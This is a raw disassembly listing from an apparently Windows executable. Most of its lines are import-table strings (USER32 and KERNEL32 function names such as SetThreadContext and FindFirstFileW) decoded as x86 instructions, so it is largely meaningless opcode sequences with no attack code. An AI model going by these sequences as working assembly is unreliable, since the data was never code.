  425e3b:	jb     0x425e7e
  425e3d:	add    BYTE PTR [ebx+0x1],ah
  425e40:	inc    edi
  425e41:	gs je  0x425e99
  425e44:	jo     0x425eaa
  425e46:	popa   
  425e47:	je     0x425eae
  425e49:	push   edx
  425e4a:	arpl   WORD PTR gs:[eax+eax*1+0x7d],si
  425e4f:	add    DWORD PTR [eax+0x69],ecx
  425e52:	fs gs inc ebx
  425e55:	popa   
  425e56:	jb     0x425ebd
  425e58:	je     0x425e5a
  425e5a:	out    dx,eax
  425e5b:	add    DWORD PTR [eax+0x65],edx
  425e5e:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  425e63:	jae    0x425ec6
  425e65:	addr16 gs push edi
  425e68:	add    BYTE PTR [eax],al
  425e6a:	pop    ebx
  425e6b:	add    BYTE PTR [ebx+0x72],al
  425e6e:	gs popa 
  425e70:	je     0x425ed7
  425e72:	dec    ecx
  425e73:	arpl   WORD PTR [edi+0x6e],bp
  425e76:	inc    esi
  425e77:	jb     0x425ee8
  425e79:	ins    DWORD PTR es:[edi],dx
  425e7a:	push   edx
  425e7b:	gs jae 0x425eed
  425e7e:	jne    0x425ef2
  425e80:	arpl   WORD PTR [ebp+0x0],sp
  425e83:	add    BYTE PTR ds:0x6e655302,ch
  425e89:	fs dec esi
  425e8b:	outs   dx,DWORD PTR ds:[esi]
  425e8c:	je     0x425ef7
  425e8e:	data16 jns 0x425ede
  425e91:	gs jae 0x425f07
  425e94:	popa   
  425e95:	addr16 gs push edi
  425e98:	add    BYTE PTR [eax],al
  425e9a:	mov    BYTE PTR [eax],al
  425e9c:	inc    esp
  425e9d:	gs inc sp
  425ea0:	ins    BYTE PTR es:[edi],dx
  425ea1:	addr16 push eax
  425ea3:	jb     0x425f14
  425ea5:	arpl   WORD PTR [edi+0x0],dx
  425ea8:	add    al,BYTE PTR [edx]
  425eaa:	push   edx
  425eab:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  425eb4:	popa   
  425eb5:	jae    0x425f2a
  425eb7:	inc    ecx
  425eb8:	add    BYTE PTR [eax],al
  425eba:	xchg   DWORD PTR [ecx],eax
  425ebc:	dec    ecx
  425ebd:	outs   dx,BYTE PTR ds:[esi]
  425ebe:	je     0x425f25
  425ec0:	jb     0x425f30
  425ec2:	popa   
  425ec3:	ins    BYTE PTR es:[edi],dx
  425ec4:	inc    edi
  425ec5:	gs je  0x425f1f
  425ec8:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425ecf:	js     0x425f45
  425ed1:	add    dh,ch
  425ed3:	add    DWORD PTR [eax+0x65],edx
  425ed6:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  425edb:	jae    0x425f3e
  425edd:	addr16 gs inc ecx
  425ee0:	add    BYTE PTR [eax],al
  425ee2:	pop    ecx
  425ee3:	add    DWORD PTR [edi+0x65],eax
  425ee6:	je     0x425f3b
  425ee8:	jns    0x425f5d
  425eea:	inc    ebx
  425eeb:	outs   dx,DWORD PTR ds:[esi]
  425eec:	ins    BYTE PTR es:[edi],dx
  425eed:	outs   dx,DWORD PTR ds:[esi]
  425eee:	jb     0x425ef0
  425ef0:	and    eax,0x74654701
  425ef5:	dec    ebx
  425ef6:	gs jns 0x425f5b
  425ef9:	outs   dx,DWORD PTR ds:[esi]
  425efa:	popa   
  425efb:	jb     0x425f61
  425efd:	dec    esp
  425efe:	popa   
  425eff:	jns    0x425f70
  425f01:	jne    0x425f77
  425f03:	dec    esi
  425f04:	popa   
  425f05:	ins    DWORD PTR es:[edi],dx
  425f06:	gs push edi
  425f08:	add    BYTE PTR [eax],al
  425f0a:	jb     0x425f0d
  425f0c:	inc    edi
  425f0d:	gs je  0x425f67
  425f10:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  425f17:	arpl   WORD PTR [eax+eax*1-0x6a],si
  425f1b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  425f1f:	outs   dx,BYTE PTR ds:[esi]
  425f20:	jae    0x425f8e
  425f22:	popa   
  425f23:	je     0x425f8a
  425f25:	dec    ebp
  425f26:	gs jae 0x425f9c
  425f29:	popa   
  425f2a:	add    BYTE PTR gs:[bx+si],al
  425f2e:	push   0x74654701
  425f33:	push   edi
  425f34:	imul   ebp,DWORD PTR [esi+0x64],0x9500776f
  425f3b:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425f3f:	je     0x425fb3
  425f41:	outs   dx,DWORD PTR ds:[esi]
  425f42:	jns    0x425f87
  425f44:	jne    0x425fb8
  425f46:	jae    0x425fb7
  425f48:	jb     0x425f4a
  425f4a:	bound  eax,QWORD PTR [ecx]
  425f4c:	inc    edi
  425f4d:	gs je  0x425fa4
  425f50:	outs   dx,DWORD PTR ds:[esi]
  425f51:	jo     0x425faa
  425f53:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425f5a:	xor    eax,DWORD PTR [ecx]
  425f5c:	inc    edi
  425f5d:	gs je  0x425fad
  425f60:	outs   dx,BYTE PTR gs:[esi]
  425f62:	jne    0x425fad
  425f64:	je     0x425fcb
  425f66:	ins    DWORD PTR es:[edi],dx
  425f67:	dec    ecx
  425f68:	inc    esp
  425f69:	add    BYTE PTR ds:0x74654701,dl
  425f6f:	inc    esi
  425f70:	outs   dx,DWORD PTR ds:[esi]
  425f71:	jb     0x425fd8
  425f73:	addr16 jb 0x425fe5
  425f76:	jne    0x425fe6
  425f78:	fs push edi
  425f7a:	imul   ebp,DWORD PTR [esi+0x64],0x3800776f
  425f81:	add    DWORD PTR [edi+0x65],eax
  425f84:	je     0x425fd3
  425f86:	outs   dx,BYTE PTR gs:[esi]
  425f88:	jne    0x425fdd
  425f8a:	je     0x425ffe
  425f8c:	imul   ebp,DWORD PTR [esi+0x67],0x58000041
  425f93:	add    BYTE PTR [ebx+0x72],al
  425f96:	gs popa 
  425f98:	je     0x425fff
  425f9a:	inc    esp
  425f9b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  425fa2:	jb     0x426005
  425fa4:	ins    DWORD PTR es:[edi],dx
  425fa5:	inc    ecx
  425fa6:	add    BYTE PTR [eax],al
  425fa8:	call   0x65b2aeae
  425fad:	outs   dx,BYTE PTR ds:[esi]
  425fae:	dec    ecx
  425faf:	arpl   WORD PTR [edi+0x6e],bp
  425fb2:	add    BYTE PTR [eax],al
  425fb4:	jecxz  0x425fb6
  425fb6:	inc    esi
  425fb7:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  425fbe:	outs   dx,DWORD PTR ds:[esi]
  425fbf:	ja     0x426006
  425fc1:	js     0x42601a
  425fc3:	add    dh,cl
  425fc5:	add    DWORD PTR [ebp+0x65],ecx
  425fc8:	jae    0x42603d
  425fca:	popa   
  425fcb:	addr16 gs inc edx
  425fce:	outs   dx,DWORD PTR ds:[esi]
  425fcf:	js     0x426012
  425fd1:	add    BYTE PTR [eax+eax*1+0x43],al
  425fd5:	ins    BYTE PTR es:[edi],dx
  425fd6:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  425fdd:	jb     0x425fdf
  425fdf:	add    BYTE PTR [ebp+0x61694400],bl
  425fe5:	ins    BYTE PTR es:[edi],dx
  425fe6:	outs   dx,DWORD PTR ds:[esi]
  425fe7:	addr16 inc edx
  425fe9:	outs   dx,DWORD PTR ds:[esi]
  425fea:	js     0x42603c
  425fec:	popa   
  425fed:	jb     0x426050
  425fef:	ins    DWORD PTR es:[edi],dx
  425ff0:	push   edi
  425ff1:	add    BYTE PTR [ebx+0x1],al
  425ff4:	inc    edi
  425ff5:	gs je  0x426046
  425ff8:	gs js  0x42606f
  425ffb:	inc    esp
  425ffc:	ins    BYTE PTR es:[edi],dx
  425ffd:	addr16 push esp
  425fff:	popa   
  426000:	bound  ecx,QWORD PTR [ecx+0x74]
  426003:	gs ins DWORD PTR es:[edi],dx
  426005:	add    BYTE PTR [eax+0x61724400],dh
  42600b:	ja     0x426053
  42600d:	outs   dx,DWORD PTR ds:[esi]
  42600e:	arpl   WORD PTR [ebp+0x73],si
  426011:	push   edx
  426012:	arpl   WORD PTR gs:[eax+eax*1-0x77],si
  426017:	add    DWORD PTR [ecx+0x6e],ecx
  42601a:	jbe    0x42607d
  42601c:	ins    BYTE PTR es:[edi],dx
  42601d:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  426025:	je     0x426027
  426027:	add    BYTE PTR [esi+0x6c694b01],ah
  42602d:	ins    BYTE PTR es:[edi],dx
  42602e:	push   esp
  42602f:	imul   ebp,DWORD PTR [ebp+0x65],0x1370072
  426036:	inc    edi
  426037:	gs je  0x426087
  42603a:	outs   dx,BYTE PTR gs:[esi]
  42603c:	jne    0x426091
  42603e:	je     0x4260a1
  426040:	je     0x4260a7
  426042:	add    BYTE PTR [eax],al
  426044:	cmp    al,BYTE PTR [edx]
  426046:	push   ebx
  426047:	gs je  0x42608d
  42604a:	jne    0x4260be
  42604c:	jae    0x4260bd
  42604e:	jb     0x4260a0
  426050:	outs   dx,DWORD PTR ds:[esi]
  426051:	jae    0x426053
  426053:	add    BYTE PTR [eax+0x2],ch
  426056:	push   ebx
  426057:	gs je  0x4260af
  42605a:	jae    0x4260c1
  42605c:	jb     0x4260ad
  42605e:	bound  ebp,QWORD PTR [edx+0x65]
  426061:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  426065:	outs   dx,WORD PTR ds:[esi]
  426067:	jb     0x4260d6
  426069:	popa   
  42606a:	je     0x4260d5
  42606c:	outs   dx,DWORD PTR ds:[esi]
  42606d:	outs   dx,BYTE PTR ds:[esi]
  42606e:	push   edi
  42606f:	add    BYTE PTR [ebx+0x61724400],ch
  426075:	ja     0x4260b8
  426077:	outs   dx,BYTE PTR ds:[esi]
  426078:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  42607f:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  426084:	mov    dl,0x1
  426086:	dec    esp
  426087:	outs   dx,DWORD PTR ds:[esi]
  426088:	popa   
  426089:	fs dec ecx
  42608b:	ins    DWORD PTR es:[edi],dx
  42608c:	popa   
  42608d:	addr16 gs push edi
  426090:	add    BYTE PTR [eax],al
  426092:	cdq    
  426093:	add    BYTE PTR [ecx+ebp*2+0x61],al
  426097:	ins    BYTE PTR es:[edi],dx
  426098:	outs   dx,DWORD PTR ds:[esi]
  426099:	addr16 inc edx
  42609b:	outs   dx,DWORD PTR ds:[esi]
  42609c:	js     0x4260e7
  42609e:	outs   dx,BYTE PTR ds:[esi]
  42609f:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4260a7:	jb     0x42610a
  4260a9:	ins    DWORD PTR es:[edi],dx
  4260aa:	inc    ecx
  4260ab:	add    al,ah
  4260ad:	add    DWORD PTR [edi+0x65],ecx
  4260b0:	ins    DWORD PTR es:[edi],dx
  4260b1:	push   esp
  4260b2:	outs   dx,DWORD PTR ds:[esi]
  4260b3:	inc    ebx
  4260b4:	push   0x417261
  4260b9:	add    bh,al
  4260bb:	add    BYTE PTR [ebp+0x6e],al
  4260be:	jne    0x42612d
  4260c0:	inc    ebx
  4260c1:	push   0x57646c69
  4260c6:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4260cd:	add    BYTE PTR [ecx],cl
  4260cf:	add    DWORD PTR [edi+0x65],eax
  4260d2:	je     0x426117
  4260d4:	jne    0x426148
  4260d6:	jae    0x426147
  4260d8:	jb     0x42612a
  4260da:	outs   dx,DWORD PTR ds:[esi]
  4260db:	jae    0x4260dd
  4260dd:	add    BYTE PTR [esi],dl
  4260df:	add    dl,BYTE PTR [edx+0x65]
  4260e2:	ins    DWORD PTR es:[edi],dx
  4260e3:	outs   dx,DWORD PTR ds:[esi]
  4260e4:	jbe    0x42614b
  4260e6:	dec    ebp
  4260e7:	outs   dx,BYTE PTR gs:[esi]
  4260e9:	jne    0x4260eb
  4260eb:	add    al,bl
  4260ed:	add    DWORD PTR [ebp+0x6f],ecx
  4260f0:	outs   dx,BYTE PTR ds:[esi]
  4260f1:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4260f9:	push   eax
  4260fa:	outs   dx,DWORD PTR ds:[esi]
  4260fb:	imul   ebp,DWORD PTR [esi+0x74],0x53550000
  426102:	inc    ebp
  426103:	push   edx
  426104:	xor    esi,DWORD PTR [edx]
  426106:	cs fs ins BYTE PTR es:[edi],dx
  426109:	ins    BYTE PTR es:[edi],dx
  42610a:	add    BYTE PTR [eax],al
  42610c:	mov    ebx,0x73655203
  426111:	gs je  0x426159
  426114:	jbe    0x42617b
  426116:	outs   dx,BYTE PTR ds:[esi]
  426117:	je     0x426119
  426119:	add    bl,bl
  42611b:	add    BYTE PTR [ebx+0x72],al
  42611e:	gs popa 
  426120:	je     0x426187
  426122:	dec    ebp
  426123:	popa   
  426124:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  42612c:	sbb    BYTE PTR [edx],al
  42612e:	inc    edi
  42612f:	gs je  0x426180
  426132:	jne    0x4261a1
  426134:	bound  esp,QWORD PTR [ebp+0x72]
  426137:	inc    esi
  426138:	outs   dx,DWORD PTR ds:[esi]
  426139:	jb     0x4261a8
  42613b:	popa   
  42613c:	je     0x426195
  42613e:	add    BYTE PTR [eax],al
  426140:	pusha  
  426141:	add    DWORD PTR [esi+0x69],eax
  426144:	outs   dx,BYTE PTR ds:[esi]
  426145:	fs inc esi
  426147:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  42614e:	gs push edi
  426150:	add    BYTE PTR [eax],al
  426152:	jecxz  0x426154
  426154:	inc    ebx
  426155:	jb     0x4261bc
  426157:	popa   
  426158:	je     0x4261bf
  42615a:	push   eax
  42615b:	imul   esi,DWORD PTR [eax+0x65],0x2850000
  426162:	inc    edi
  426163:	gs je  0x4261bd
  426166:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  42616d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  426174:	jns    0x4261cd
  426176:	add    BYTE PTR [eax],al
  426178:	fiadd  DWORD PTR [edx]
  42617a:	dec    ecx
  42617b:	jae    0x4261d3
  42617d:	popa   
  42617e:	ins    BYTE PTR es:[edi],dx
  42617f:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  426187:	addr16 gs inc edi
  42618a:	jb     0x4261fb
  42618c:	jne    0x4261fe
  42618e:	add    BYTE PTR [eax],al
  426190:	outs   dx,DWORD PTR ds:[esi]
  426191:	add    DWORD PTR [esi+0x69],eax
  426194:	outs   dx,BYTE PTR ds:[esi]
  426195:	fs push edx
  426197:	gs jae 0x426209
  42619a:	jne    0x42620e
  42619c:	arpl   WORD PTR [ebp+0x57],sp
  42619f:	add    al,cl
  4261a1:	add    cl,BYTE PTR [ecx+0x73]
  4261a4:	inc    edx
  4261a5:	popa   
  4261a6:	fs inc ebx
  4261a8:	outs   dx,DWORD PTR ds:[esi]
  4261a9:	fs gs push eax
  4261ac:	je     0x426220
  4261ae:	add    BYTE PTR [eax],al
  4261b0:	mov    BYTE PTR [eax],al
  4261b2:	inc    ecx
  4261b3:	jb     0x42621a
  4261b5:	inc    esi
  4261b6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  4261be:	dec    esi
  4261bf:	push   ebx
  4261c0:	dec    ecx
  4261c1:	add    BYTE PTR [eax+0x4],al
  4261c4:	push   ebx
  4261c5:	gs je  0x42621c
  4261c8:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4261cf:	jne    0x426236
  4261d1:	push   esp
  4261d2:	imul   ebp,DWORD PTR [ebp+0x65],0x90000072
  4261d9:	add    DWORD PTR [edi+0x65],eax
  4261dc:	je     0x426221
  4261de:	push   eax
  4261df:	dec    ecx
  4261e0:	outs   dx,BYTE PTR ds:[esi]
  4261e1:	outs   dx,WORD PTR ds:[esi]
  4261e3:	add    BYTE PTR [edi],ah
  4261e5:	add    al,0x53
  4261e7:	gs je  0x426238
  4261ea:	popa   
  4261eb:	ins    DWORD PTR es:[edi],dx
  4261ec:	gs fs push eax
  4261ef:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  4261f6:	ins    BYTE PTR es:[edi],dx
  4261f7:	gs push ebx
  4261f9:	je     0x42625c
  4261fb:	je     0x426262
  4261fd:	add    BYTE PTR [ebp+0x69615704],cl
  426203:	je     0x42624b
  426205:	outs   dx,DWORD PTR ds:[esi]
  426206:	jb     0x426255
  426208:	jne    0x426276
  42620a:	je     0x426275
  42620c:	jo     0x42627a
  42620e:	gs dec edi
  426210:	bound  ebp,QWORD PTR [edx+0x65]
  426213:	arpl   WORD PTR [ebx+esi*2+0x45],si
  426217:	js     0x426219
  426219:	add    BYTE PTR [esi+0x4],cl
  42621c:	push   ebx
  42621d:	ins    BYTE PTR es:[edi],dx
  42621e:	gs gs jo 0x426267
  426222:	js     0x426224
  426224:	mov    ah,0x3
  426226:	push   edx
  426227:	gs ins DWORD PTR es:[edi],dx
  426229:	outs   dx,DWORD PTR ds:[esi]
  42622a:	jbe    0x426291
  42622c:	inc    esp
  42622d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  426234:	jns    0x42628d
  426236:	add    BYTE PTR [eax],al
  426238:	dec    edi
  426239:	add    al,BYTE PTR [edi+0x65]
  42623c:	je     0x426291
  42623e:	jns    0x4262b3
  426240:	je     0x4262a7
  426242:	ins    DWORD PTR es:[edi],dx
  426243:	inc    esp
  426244:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42624b:	jns    0x42628e
  42624d:	add    BYTE PTR [ebp+0x1],bl
  426250:	inc    esi
  426251:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  426258:	je     0x4262a0
  42625a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4360000
  426262:	push   ebx
  426263:	gs je  0x4262ba
  426266:	push   0x64616572
  42626b:	inc    ebx
  42626c:	outs   dx,DWORD PTR ds:[esi]
  42626d:	outs   dx,BYTE PTR ds:[esi]
  42626e:	je     0x4262d5
  426270:	js     0x4262e6
  426272:	add    BYTE PTR [eax],al
  426274:	out    dx,al
  426275:	add    DWORD PTR [edi+0x65],eax
  426278:	je     0x4262c0
  42627a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  426282:	mov    dl,0x0
  426284:	inc    ebx
  426285:	outs   dx,DWORD PTR ds:[esi]
  426286:	ins    DWORD PTR es:[edi],dx
  426287:	jo     0x4262ea
  426289:	jb     0x4262f0
  42628b:	inc    esi
  42628c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  426294:	ja     0x426297
  426296:	inc    esi
  426297:	ins    BYTE PTR es:[edi],dx
  426298:	jne    0x42630d
  42629a:	push   0x656c6946
  42629f:	inc    edx
  4262a0:	jne    0x426308
  4262a2:	data16 gs jb 0x426319
  4262a6:	add    BYTE PTR [eax],al
  4262a8:	int3   
  4262a9:	add    al,0x6c
  4262ab:	jae    0x426321
  4262ad:	jb     0x426312
  4262af:	jo     0x42632a
  4262b1:	outs   dx,BYTE PTR ds:[esi]
  4262b2:	push   edi
  4262b3:	add    BYTE PTR [eax+0x61654802],dh
  4262b9:	jo     0x426310
  4262bb:	outs   dx,BYTE PTR ds:[esi]
  4262bc:	ins    BYTE PTR es:[edi],dx
  4262bd:	outs   dx,DWORD PTR ds:[esi]
  4262be:	arpl   WORD PTR [ebx+0x0],bp
  4262c1:	add    BYTE PTR [edi+0x6c655203],ch
  4262c7:	gs popa 
  4262c9:	jae    0x426330
  4262cb:	dec    ebp
  4262cc:	jne    0x426342
  4262ce:	gs js  0x4262d1
  4262d1:	add    BYTE PTR [eax],cl
  4262d3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4262d7:	fs dec esp
  4262d9:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  4262e0:	add    BYTE PTR [eax],al
  4262e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262e3:	add    BYTE PTR [ebx+0x61],al
  4262e6:	outs   dx,BYTE PTR ds:[esi]
  4262e7:	arpl   WORD PTR [ebp+0x6c],sp
  4262ea:	push   edi
  4262eb:	popa   
  4262ec:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4262f4:	ins    DWORD PTR es:[edi],dx
  4262f5:	gs jb  0x4262f8
  4262f8:	add    al,0x1
  4262fa:	inc    esp
  4262fb:	gs ins BYTE PTR es:[edi],dx
  4262fd:	gs je  0x426365
  426300:	inc    esi
  426301:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4300e000
  426309:	jb     0x426370
  42630b:	popa   
  42630c:	je     0x426373
  42630e:	dec    ebp
  42630f:	jne    0x426385
  426311:	gs js  0x42636b
  426314:	add    BYTE PTR [eax],al
  426316:	add    al,BYTE PTR [bx+0x65]
  42631a:	je     0x426370
  42631c:	push   0x64616572
  426321:	dec    esp
  426322:	outs   dx,DWORD PTR ds:[esi]
  426323:	arpl   WORD PTR [ecx+0x6c],sp
  426326:	add    BYTE PTR gs:[edi+0x2],ch
  42632a:	inc    edi
  42632b:	gs je  0x426382
  42632e:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  426335:	popa   
  426336:	je     0x426379
  426338:	add    BYTE PTR [eax],al
  42633a:	into   
  42633b:	add    al,0x6c
  42633d:	jae    0x4263b3
  42633f:	jb     0x4263ad
  426341:	outs   dx,BYTE PTR gs:[esi]
  426343:	inc    ecx
  426344:	add    BYTE PTR [eax],al
  426346:	adc    al,0x3
  426348:	dec    esp
  426349:	outs   dx,DWORD PTR ds:[esi]
  42634a:	arpl   WORD PTR [ecx+0x6c],sp
  42634d:	push   ebx
  42634e:	imul   edi,DWORD PTR [edx+0x65],0x46016d00
  426355:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  42635c:	jne    0x4263d0
  42635e:	arpl   WORD PTR [ebp+0x45],sp
  426361:	js     0x4263a4
  426363:	add    BYTE PTR [ecx+eax*1+0x46],bl
  426367:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42636e:	je     0x4263b3
  426370:	push   0x65676e61
  426375:	dec    esi
  426376:	outs   dx,DWORD PTR ds:[esi]
  426377:	je     0x4263e2
  426379:	imul   sp,WORD PTR [ebx+0x61],0x6974
  42637f:	outs   dx,DWORD PTR ds:[esi]
  426380:	outs   dx,BYTE PTR ds:[esi]
  426381:	push   edi
  426382:	add    BYTE PTR [eax],al
  426384:	xchg   edi,eax
  426385:	add    DWORD PTR [edi+0x65],eax
  426388:	je     0x4263cd
  42638a:	outs   dx,DWORD PTR ds:[esi]
  42638b:	ins    DWORD PTR es:[edi],dx
  42638c:	ins    DWORD PTR es:[edi],dx
  42638d:	dec    ebp
  42638e:	outs   dx,DWORD PTR ds:[esi]
  42638f:	fs gs ins DWORD PTR es:[edi],dx
  426392:	push   ebx
  426393:	je     0x4263f6
  426395:	je     0x42640c
  426397:	jae    0x426399
  426399:	add    BYTE PTR [edi],dl
  42639b:	add    al,BYTE PTR [edi+0x65]
  42639e:	je     0x4263ed
  4263a0:	outs   dx,DWORD PTR ds:[esi]
  4263a1:	fs jne 0x426410
  4263a4:	gs dec eax
  4263a6:	popa   
  4263a7:	outs   dx,BYTE PTR ds:[esi]
  4263a8:	fs ins BYTE PTR es:[edi],dx
  4263aa:	gs inc ebp
  4263ac:	js     0x426405
  4263ae:	add    BYTE PTR [eax],al
  4263b0:	cmp    eax,DWORD PTR [ebx]
  4263b2:	dec    edi
  4263b3:	jo     0x42641a
  4263b5:	outs   dx,BYTE PTR ds:[esi]
  4263b6:	inc    esi
  4263b7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4263bf:	outs   dx,BYTE PTR ds:[esi]
  4263c0:	addr16 inc ecx
  4263c2:	add    BYTE PTR [eax],al
  4263c4:	sbb    BYTE PTR [ebx+edx*2],al
  4263c7:	gs je  0x426410
  4263ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4263d2:	gs jb  0x4263d5
  4263d5:	add    BYTE PTR [eax+0x2],dh
  4263d8:	inc    edi
  4263d9:	gs je  0x426430
  4263dc:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  4263e3:	popa   
  4263e4:	je     0x42643d
  4263e6:	add    BYTE PTR [eax],al
  4263e8:	xchg   ebp,eax
  4263e9:	add    DWORD PTR [edi+0x65],eax
  4263ec:	je     0x426431
  4263ee:	outs   dx,DWORD PTR ds:[esi]
  4263ef:	ins    DWORD PTR es:[edi],dx
  4263f0:	ins    DWORD PTR es:[edi],dx
  4263f1:	inc    ebx
  4263f2:	outs   dx,DWORD PTR ds:[esi]
  4263f3:	outs   dx,BYTE PTR ds:[esi]
  4263f4:	imul   sp,WORD PTR [edi+0x0],0x2ce
  4263fa:	dec    ecx
  4263fb:	jae    0x42643f
  4263fd:	popa   
  4263fe:	fs push edi
  426400:	jb     0x42646b
  426402:	je     0x426469
  426404:	push   eax
  426405:	je     0x426479
  426407:	add    BYTE PTR [ecx+eax*1+0x46],ch
  42640b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  426412:	jne    0x426486
  426414:	arpl   WORD PTR [ebp+0x41],sp
  426417:	add    bl,ah
  426419:	add    edx,DWORD PTR [ebx+0x65]
  42641c:	je     0x426461
  42641e:	outs   dx,DWORD PTR ds:[esi]
  42641f:	ins    DWORD PTR es:[edi],dx
  426420:	ins    DWORD PTR es:[edi],dx
  426421:	push   ebx
  426422:	je     0x426485
  426424:	je     0x42648b
  426426:	add    BYTE PTR [eax],al
  426428:	imul   eax,DWORD PTR [edx],0x54746547
  42642e:	push   0x64616572
  426433:	push   eax
  426434:	jb     0x42649f
  426436:	outs   dx,DWORD PTR ds:[esi]
  426437:	jb     0x4264a2
  426439:	je     0x4264b4
  42643b:	add    BYTE PTR [ebx],al
  42643d:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  426441:	gs je  0x4264a9
  426444:	inc    esi
  426445:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x53044100
  42644d:	gs je  0x4264a5
  426450:	outs   dx,BYTE PTR ds:[esi]
  426451:	push   0x6c646e61
  426456:	gs fs inc ebp
  426459:	js     0x4264be
  42645b:	gs jo  0x4264d2
  42645e:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  426465:	gs jb  0x426468
  426468:	mov    WORD PTR [ecx],es
  42646a:	inc    edi
  42646b:	gs je  0x4264af
  42646e:	je     0x4264df
  426470:	ins    DWORD PTR es:[edi],dx
  426471:	dec    esi
  426472:	popa   
  426473:	ins    DWORD PTR es:[edi],dx
  426474:	gs push edi
  426476:	add    BYTE PTR [eax],al
  426478:	rol    BYTE PTR [esp+ebp*2],0x73
  42647c:	je     0x4264f0
  42647e:	arpl   WORD PTR [ecx+0x74],sp
  426481:	push   edi
  426482:	add    BYTE PTR [eax],al
  426484:	jae    0x426488
  426486:	inc    edi
  426487:	gs je  0x4264df
  42648a:	jae    0x4264f1
  42648c:	jb     0x4264d2
  42648e:	gs popaw 
  426491:	jne    0x4264ff
  426493:	je     0x4264e1
  426495:	inc    ebx
  426496:	dec    ecx
  426497:	inc    esp
  426498:	add    BYTE PTR [eax],al
  42649a:	dec    ebx
  42649b:	inc    ebp
  42649c:	push   edx
  42649d:	dec    esi
  42649e:	inc    ebp
  42649f:	dec    esp
  4264a0:	xor    esi,DWORD PTR [edx]
  4264a2:	cs fs ins BYTE PTR es:[edi],dx
  4264a5:	ins    BYTE PTR es:[edi],dx
  4264a6:	add    BYTE PTR [eax],al
  4264a8:	cmc    
  4264a9:	add    BYTE PTR [edi+0x63],bl
  4264ac:	outs   dx,DWORD PTR ds:[esi]
  4264ad:	outs   dx,BYTE PTR ds:[esi]
  4264ae:	je     0x426522
  4264b0:	outs   dx,DWORD PTR ds:[esi]
  4264b1:	ins    BYTE PTR es:[edi],dx
  4264b2:	data16 jo 0x4264b5
  4264b5:	add    BYTE PTR [ecx+0x77736903],ch
  4264bb:	jae    0x42652d
  4264bd:	popa   
  4264be:	arpl   WORD PTR [ebp+0x0],sp
  4264c1:	add    BYTE PTR [edi+0x74656703],cl
  4264c7:	jae    0x4264c9
  4264c9:	add    BYTE PTR [ebx+0x70736903],bl
  4264cf:	jb     0x42653a
  4264d1:	outs   dx,BYTE PTR ds:[esi]
  4264d2:	je     0x4264d4
  4264d4:	mov    bl,0x0
  4264d6:	pop    edi
  4264d7:	pop    edi
  4264d8:	jae    0x42653f
  4264da:	je     0x42653b
  4264dc:	popa   
  4264dd:	jo     0x42654f
  4264df:	pop    edi
  4264e0:	je     0x42655b
  4264e2:	jo     0x426549
  4264e4:	add    BYTE PTR [eax],al
  4264e6:	mov    al,ds:0x705f5f00
  4264eb:	pop    edi
  4264ec:	pop    edi
  4264ed:	ins    WORD PTR es:[edi],dx
  4264ef:	outs   dx,DWORD PTR ds:[esi]
  4264f0:	fs add BYTE PTR gs:[eax],al
  4264f4:	xor    DWORD PTR [edi+esi*2],eax
  4264f7:	arpl   WORD PTR [ebx+0x73],si
  4264fa:	je     0x42656e
  4264fc:	add    BYTE PTR [eax],al
  4264fe:	cli    
  4264ff:	add    esi,DWORD PTR [ebx+0x74]
  426502:	jb     0x426578
  426504:	outs   dx,DWORD PTR ds:[esi]
  426505:	imul   eax,DWORD PTR [eax],0x0
  426508:	out    0x3,eax
  42650a:	jae    0x426580
  42650c:	jb     0x426571
  42650e:	outs   dx,DWORD PTR ds:[esi]
  42650f:	ins    BYTE PTR es:[edi],dx
  426510:	ins    BYTE PTR es:[edi],dx
  426511:	add    BYTE PTR [ebx+0x705f5f00],bl
  426517:	pop    edi
  426518:	pop    edi
  426519:	arpl   WORD PTR [edi+0x6d],bp
